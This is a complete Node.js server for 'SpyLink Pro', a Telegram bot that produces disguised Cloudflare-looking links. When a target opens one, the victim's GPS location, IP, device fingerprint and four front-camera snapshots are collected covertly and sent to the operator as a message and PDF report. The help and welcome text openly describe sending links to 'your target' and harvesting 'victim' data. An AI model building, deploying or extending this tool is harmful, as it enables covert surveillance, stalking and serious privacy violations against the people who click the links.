// server.js
require('dotenv').config();
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const pdfMake = require('pdfmake');
const fonts = {
  Roboto: {
    normal: 'Helvetica',
    bold: 'Helvetica-Bold',
    italics: 'Helvetica-Oblique',
    bolditalics: 'Helvetica-BoldOblique'
  }
};
const printer = new pdfMake(fonts);
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

// Security & Performance
app.use(require('helmet')());
app.use(require('compression')());
app.use(require('morgan')('combined'));
app.use(require('response-time')());

// Middlewares
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.set("view engine", "ejs");
app.use(express.static("public"));

// In-Memory "Database"
let sessions = {}; // { sessionId: { chatId, url, data, location, images[], createdAt, completedAt } }
let adminAccessList = {}; // { chatId: true }

const hostURL = process.env.HOST_URL || "https://yourdomain.com";

// ==================== TELEGRAM BOT HANDLERS ====================

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text?.trim();

  // Grant Admin Access
  if (text === "/admin" && String(chatId) === process.env.ADMIN_CHAT_ID) {
    adminAccessList[chatId] = true;
    return bot.sendMessage(chatId, "🔐 *Admin Access Granted*\nUse /panel to open dashboard.", { parse_mode: "Markdown" });
  }

  // Handle URL reply
  if (msg?.reply_to_message?.text === "🌐 Please send the target URL (must start with http:// or https://)") {
    return await handleUrlSubmission(chatId, text);
  }

  // Command Router
  switch (text) {
    case "/start":
      return sendWelcomeMessage(chatId, msg.from.first_name);
    case "/create":
      return requestTargetUrl(chatId);
    case "/help":
      return sendHelp(chatId);
    case "/panel":
      if (adminAccessList[chatId]) return showAdminPanel(chatId);
      else bot.sendMessage(chatId, "⛔ Access Denied. Only admins can use this.");
      break;
    default:
      if (!text) return;
      bot.sendMessage(chatId, "❓ Unknown command. Type /help for instructions.");
  }
});

bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  await bot.answerCallbackQuery(callbackQuery.id);

  if (data.startsWith("genpdf_")) {
    const sessionId = data.split("_")[1];
    await generateAndSendPDF(chatId, sessionId);
  } else if (data === "view_all_sessions" && adminAccessList[chatId]) {
    viewAllSessions(chatId);
  } else if (data === "export_all_data" && adminAccessList[chatId]) {
    exportAllData(chatId);
  } else if (data === "clear_all_sessions" && adminAccessList[chatId]) {
    sessions = {};
    bot.sendMessage(chatId, "🗑️ All sessions cleared.");
  } else if (data === "create_new_link") {
    requestTargetUrl(chatId);
  }
});

// ==================== DATA COLLECTION ENDPOINTS ====================

app.post("/location", async (req, res) => {
  const { uid, lat, lon, acc } = req.body;
  const sessionId = uid; // We now use UUID as session ID directly

  if (lat && lon && sessionId && sessions[sessionId]) {
    sessions[sessionId].location = { lat: parseFloat(lat), lon: parseFloat(lon), accuracy: parseFloat(acc) };
    checkSessionCompletion(sessionId);
    res.send("Location received");
  } else {
    res.status(400).send("Invalid or missing data");
  }
});

app.post("/camsnap", async (req, res) => {
  const { uid, img } = req.body;
  const sessionId = uid;

  if (img && sessionId && sessions[sessionId]) {
    if (!sessions[sessionId].images) sessions[sessionId].images = [];
    if (sessions[sessionId].images.length < 4) {
      sessions[sessionId].images.push(img); // store base64 string
      checkSessionCompletion(sessionId);
    }
    res.send("Image received");
  } else {
    res.status(400).send("Invalid image or session");
  }
});

app.post("/data", async (req, res) => {
  const { uid, data } = req.body;
  const sessionId = uid;

  if (data && sessionId) {
    if (!sessions[sessionId]) {
      // Initialize session if not exists
      sessions[sessionId] = {
        chatId: parseInt(sessionId, 36), // backward compatibility fallback
        data: decodeURIComponent(data),
        images: [],
        createdAt: new Date(),
        ip: getIP(req)
      };
    } else {
      sessions[sessionId].data = decodeURIComponent(data);
    }
    checkSessionCompletion(sessionId);
    res.send("Data received");
  } else {
    res.status(400).send("Invalid payload");
  }
});

// ==================== SESSION COMPLETION CHECKER ====================

function checkSessionCompletion(sessionId) {
  const session = sessions[sessionId];
  if (!session || session.completed) return;

  const hasData = !!session.data;
  const hasLocation = !!session.location;
  const hasFourImages = session.images && session.images.length >= 4;

  if (hasData && hasLocation && hasFourImages) {
    session.completed = true;
    session.completedAt = new Date();
    setTimeout(() => deliverReport(sessionId), 1000); // slight delay for stability
  }
}

async function deliverReport(sessionId) {
  const session = sessions[sessionId];
  if (!session || !session.completed) return;

  const chatId = session.chatId;

  try {
    // Format Data for Telegram
    let formattedData = session.data
      .replaceAll("<br>", "\n")
      .replaceAll("<b>", "*")
      .replaceAll("</b>", "*")
      .replaceAll("<code>", "`")
      .replaceAll("</code>", "`")
      .replaceAll("&nbsp;", " ");

    let message = `
✅ *FULL VICTIM REPORT RECEIVED*

📊 *Session ID:* \`${sessionId}\`
🌐 *Original URL:* ${session.url || 'N/A'}
📍 *Location:* https://www.google.com/maps?q=${session.location.lat},${session.location.lon}
📅 *Captured At:* ${session.completedAt.toLocaleString()}

📄 *DEVICE & BROWSER DATA:*
${formattedData}

📷 *Captured 4 camera snapshots.*
`;

    // Send all camera images first
    for (let img of session.images) {
      const buffer = Buffer.from(img, 'base64');
      await bot.sendPhoto(chatId, buffer, { caption: "📸 Camera Snapshot" });
    }

    // Send consolidated message
    await bot.sendMessage(chatId, message, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📥 Download Full PDF Report", callback_data: `genpdf_${sessionId}` }],
          [{ text: "🆕 Create New Link", callback_data: "create_new_link" }]
        ]
      }
    });

    // Auto-generate and send PDF after 3 seconds
    setTimeout(() => generateAndSendPDF(chatId, sessionId), 3000);

  } catch (error) {
    console.error("Error delivering report:", error);
    bot.sendMessage(chatId, "❌ Error sending full report. Admin notified.");
  }
}

// ==================== PDF GENERATOR ====================

async function generateAndSendPDF(chatId, sessionId) {
  const session = sessions[sessionId];
  if (!session) return bot.sendMessage(chatId, "❌ Session expired or not found.");

  try {
    const docDefinition = {
      pageSize: 'A4',
      pageMargins: [40, 60, 40, 60],
      header: {
        columns: [
          { text: '🕵️ SPYLINK PRO REPORT', style: 'header', alignment: 'center' }
        ],
        margin: [0, 20, 0, 20]
      },
      footer: (currentPage, pageCount) => {
        return {
          text: `Page ${currentPage} of ${pageCount} • Generated on ${new Date().toLocaleString()}`,
          alignment: 'center',
          fontSize: 9,
          margin: [0, 10, 0, 0]
        };
      },
      content: [
        { text: `Session ID: ${sessionId}`, style: 'subheader' },
        { text: `Victim IP: ${session.ip || 'Unknown'}`, style: 'subheader' },
        { text: `Timestamp: ${session.completedAt.toLocaleString()}`, style: 'subheader' },
        { text: `Target URL: ${session.url || 'N/A'}`, style: 'subheader' },
        { text: '\n\n' },

        { text: '📍 LOCATION DATA', style: 'section' },
        `Latitude: ${session.location.lat}`,
        `Longitude: ${session.location.lon}`,
        `Accuracy: ${session.location.accuracy} meters`,
        `Google Maps: https://www.google.com/maps?q=${session.location.lat},${session.location.lon}`,
        { text: '\n\n' },

        { text: '📱 DEVICE & BROWSER FINGERPRINT', style: 'section' },
        ...session.data
          .replace(/<[^>]*>?/gm, '')
          .split('<br>')
          .filter(line => line.trim())
          .map(line => ({ text: line, margin: [0, 0, 0, 2] })),
        { text: '\n\n' },

        { text: '📸 CAMERA SNAPSHOTS', style: 'section' },
        ...session.images.map(img => ({
          image: `data:image/png;base64,${img}`,
          width: 400,
          margin: [0, 10, 0, 10]
        }))
      ],
      styles: {
        header: { fontSize: 20, bold: true, color: '#2c3e50' },
        subheader: { fontSize: 12, italic: true, margin: [0, 5, 0, 10] },
        section: { fontSize: 16, bold: true, color: '#e74c3c', margin: [0, 15, 0, 5] }
      }
    };

    const pdfDoc = printer.createPdfKitDocument(docDefinition);
    const chunks = [];
    pdfDoc.on('data', chunk => chunks.push(chunk));
    pdfDoc.on('end', async () => {
      const result = Buffer.concat(chunks);
      await bot.sendDocument(chatId, result, {}, {
        caption: `📄 SpyLink Pro Report\nSession: ${sessionId}`,
        filename: `spylink_report_${sessionId}.pdf`
      });
    });
    pdfDoc.end();

  } catch (error) {
    console.error("PDF Generation Error:", error);
    bot.sendMessage(chatId, "❌ Failed to generate PDF. Retry via button.");
  }
}

// ==================== ADMIN PANEL ====================

function showAdminPanel(chatId) {
  const totalSessions = Object.keys(sessions).length;
  const completedSessions = Object.values(sessions).filter(s => s.completed).length;

  let msg = `
🔐 *ADMIN DASHBOARD*

📊 Total Sessions: *${totalSessions}*
✅ Completed: *${completedSessions}*
⏳ Pending: *${totalSessions - completedSessions}*

🛠️ *Actions:*
`;
  bot.sendMessage(chatId, msg, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "👁️ View All Sessions", callback_data: "view_all_sessions" }],
        [{ text: "💾 Export All Data (JSON)", callback_data: "export_all_data" }],
        [{ text: "🗑️ Clear All Sessions", callback_data: "clear_all_sessions" }]
      ]
    }
  });
}

function viewAllSessions(chatId) {
  if (Object.keys(sessions).length === 0) {
    return bot.sendMessage(chatId, "📭 No sessions recorded yet.");
  }

  let msg = "*📋 ALL SESSIONS*\n\n";
  for (let [id, sess] of Object.entries(sessions)) {
    msg += `📄 *ID:* \`${id}\`\n`;
    msg += `👤 User: \`${sess.chatId}\`\n`;
    msg += `✅ Status: ${sess.completed ? 'Completed' : 'Pending'}\n`;
    msg += `🌐 URL: ${sess.url || 'N/A'}\n`;
    msg += `🕒 Created: ${new Date(sess.createdAt).toLocaleTimeString()}\n`;
    msg += `📷 Images: ${sess.images?.length || 0}/4\n`;
    msg += `${sess.location ? '📍 Location: Captured' : '📍 Location: Pending'}\n`;
    msg += "---\n";
  }

  bot.sendMessage(chatId, msg, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔙 Back to Panel", callback_data: "back_to_panel" }]
      ]
    }
  });
}

function exportAllData(chatId) {
  const exportData = {
    timestamp: new Date().toISOString(),
    totalSessions: Object.keys(sessions).length,
    sessions: { ...sessions }
  };

  // Sanitize binary data for JSON
  for (let id in exportData.sessions) {
    if (exportData.sessions[id].images) {
      exportData.sessions[id].images = exportData.sessions[id].images.map((img, i) => `[Image ${i+1} - Base64 Snippet: ${img.substring(0, 50)}...]`);
    }
  }

  const buffer = Buffer.from(JSON.stringify(exportData, null, 2));
  bot.sendDocument(chatId, buffer, {}, {
    caption: "💾 Full Data Export (JSON)",
    filename: `spylink_export_${Date.now()}.json`
  });
}

// ==================== UTILITIES ====================

function getIP(req) {
  return (
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.connection?.remoteAddress ||
    req.socket?.remoteAddress ||
    req.ip ||
    'Unknown'
  );
}

async function handleUrlSubmission(chatId, url) {
  if (!url || !/^https?:\/\//i.test(url)) {
    bot.sendMessage(chatId, "⚠️ Invalid URL. Must start with http:// or https://");
    return requestTargetUrl(chatId);
  }

  const sessionId = uuidv4(); // Generate secure UUID
  sessions[sessionId] = {
    chatId: chatId,
    url: url,
    createdAt: new Date()
  };

  const encodedUrl = btoa(encodeURIComponent(url));
  const trackingLink = `${hostURL}/c/${sessionId}/${encodedUrl}`;

  let message = `
✅ *TRACKING LINK GENERATED*

🔗 *Target URL:* ${url}
🆔 *Session ID:* \`${sessionId}\`

🌐 *Send this link to your target:*
${trackingLink}

⏳ *Bot will wait until:*
• Full device fingerprint
• GPS location
• 4 camera snapshots
→ Then send ONE consolidated report + PDF.

⚠️ Works best on mobile devices with camera & location permissions.
`;

  bot.sendMessage(chatId, message, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📥 Regenerate PDF Later", callback_data: `genpdf_${sessionId}` }],
        [{ text: "🆕 Create Another Link", callback_data: "create_new_link" }]
      ]
    }
  });
}

function requestTargetUrl(chatId) {
  bot.sendMessage(chatId, "🌐 Please send the target URL (must start with http:// or https://)", {
    reply_markup: { force_reply: true }
  });
}

function sendWelcomeMessage(chatId, firstName) {
  bot.sendMessage(chatId, `🎯 *Welcome ${firstName} to SpyLink Pro!*

I generate stealthy Cloudflare-style tracking links that silently collect:

📍 Real-time GPS Location
📱 Full Device/Browser Fingerprint
🔋 Battery, Network, Sensors, Permissions
📷 4 Front Camera Snapshots
🖨️ Auto-generated PDF Reports

👇 *Start Now:*
`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Tracking Link", callback_data: "create_new_link" }],
        [{ text: "📘 Help & Instructions", callback_data: "help" }]
      ]
    }
  });
}

function sendHelp(chatId) {
  bot.sendMessage(chatId, `📘 *HOW TO USE SPYLINK PRO*

1. Tap /create or “Create Tracking Link”
2. Send any URL (e.g., https://google.com)
3. You’ll get a *Cloudflare-looking tracking link*
4. Send it to your target (works best on mobile)
5. When opened, victim’s browser will:
   → Collect device, network, battery, sensor data
   → Request location permission
   → Capture 4 front-camera photos (every 2 sec)
6. ⏳ Bot WAITS until ALL data is collected
7. You receive ONE detailed message + 4 photos + auto-generated PDF

🔐 Admin? Use /admin then /panel

👨‍💻 Support: @aadi_io`, { parse_mode: "Markdown" });
}

// ==================== EXPRESS ROUTES ====================

app.get("/c/:sessionId/:encodedUrl", (req, res) => {
  const { sessionId, encodedUrl } = req.params;
  const url = decodeURIComponent(atob(encodedUrl));

  if (sessions[sessionId]) {
    sessions[sessionId].lastAccessed = new Date();
  }

  res.render("cloudflare", {
    ip: getIP(req),
    time: new Date().toISOString().replace('T', ' ').substring(0, 19),
    url: url,
    uid: sessionId,
    a: hostURL,
    t: false // disable external IP fetch for speed
  });
});

app.get("/", (req, res) => {
  res.json({
    status: "SpyLink Pro Running",
    version: "3.0",
    sessions: Object.keys(sessions).length,
    uptime: process.uptime()
  });
});

// ==================== START SERVER ====================

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 SpyLink Pro v3.0 | Port: ${PORT}`);
  console.log(`🔗 Host: ${hostURL}`);
  console.log(`🤖 Bot is polling...`);
});
